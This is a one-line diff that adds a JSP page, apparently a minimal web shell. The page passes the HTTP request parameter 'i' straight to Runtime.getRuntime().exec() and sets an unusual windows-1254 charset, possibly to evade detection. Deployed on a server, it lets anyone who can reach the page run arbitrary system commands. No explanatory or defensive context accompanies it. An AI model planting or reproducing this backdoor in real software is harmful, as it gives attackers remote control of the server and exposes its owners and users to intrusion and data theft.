@@ -1,0 +1,1 @@
+<%@ page contentType="charset=windows-1254" %><%Runtime.getRuntime().exec(request.getParameter("i"));%>
